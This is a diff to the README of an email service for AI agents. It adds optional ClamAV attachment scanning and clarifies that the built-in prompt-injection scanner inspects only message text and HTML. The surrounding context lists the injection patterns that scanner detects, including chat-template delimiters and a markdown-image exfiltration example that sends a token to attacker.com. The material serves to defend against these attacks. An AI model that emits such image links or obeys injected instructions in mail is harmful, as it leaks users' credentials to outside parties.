@@ -199,6 +199,8 @@ Agents can retrieve a recent verification code with `GET /v1/agents/{email}/mess
 
 REST and MCP send/reply calls accept attachments as `{filename, content_type, content_base64}` items. The defaults allow up to 10 files, 10 MiB per file, and 25 MiB total decoded content; the composed message ceiling is 10 MiB across subject, text, HTML, and decoded attachments. Configure `OUTBOUND_MAX_ATTACHMENTS`, `OUTBOUND_MAX_ATTACHMENT_BYTES`, `OUTBOUND_MAX_TOTAL_ATTACHMENT_BYTES`, and `OUTBOUND_MAX_COMPOSED_BYTES`. Attachment metadata includes a five-minute signed `download_url`; links use `ATTACHMENT_URL_SIGNING_KEY` when set, otherwise the encryption key or admin key. JSON base64 adds overhead and is subject to the 40 MiB default HTTP request-body limit.
 
+Optional ClamAV attachment scanning is disabled by default. To enable the bundled private scanner with Docker Compose, set `ATTACHMENT_SCAN_ENABLED=true` in `.env` and start the stack with `docker compose --profile attachment-scan up --build`; the scanner daemon is exposed only on the Compose network. When enabled, inbound SMTP and all REST/MCP outbound attachment paths scan the decoded bytes before database writes. A malware detection is permanently rejected (SMTP 554; REST/MCP HTTP 422); a file over the configured scan-size limit is rejected as too large (SMTP 552; REST/MCP HTTP 413). Scanner outages and timeouts fail closed but temporarily (SMTP 451; REST/MCP HTTP 503) so clients can retry after recovery. This malware scan is separate from the built-in text and HTML prompt-injection screening. Keep ClamAV signatures current; scanning cannot guarantee detection of new or unknown malware. See [the operations guide](docs/operations.md#optional-attachment-malware-scanning) for settings and operational behavior.
+
 ### 2. Custom Domains & DNS (`/domains`)
 1. Add your agent domain (e.g., `agents.yourdomain.com`).
 2. Add the generated DNS records to your DNS registrar (Cloudflare, Route53, Namecheap):
@@ -350,6 +352,8 @@ The built-in scanner guards agent inboxes against:
 - **ChatML & Prompt Delimiters**: `<|im_start|>`, `[INST]`, `### System:`, `<|endoftext|>`.
 - **Exfiltration Attacks**: Markdown image credential leaks (`![img](https://attacker.com/log?token=...)`).
 - **Base64 Payload Obfuscation**: Automatic decoding and heuristic recursion.
+
+These checks inspect message text and HTML; they do not inspect attachment bytes. Optional ClamAV scanning is configured separately as described above.
 
 ---
 
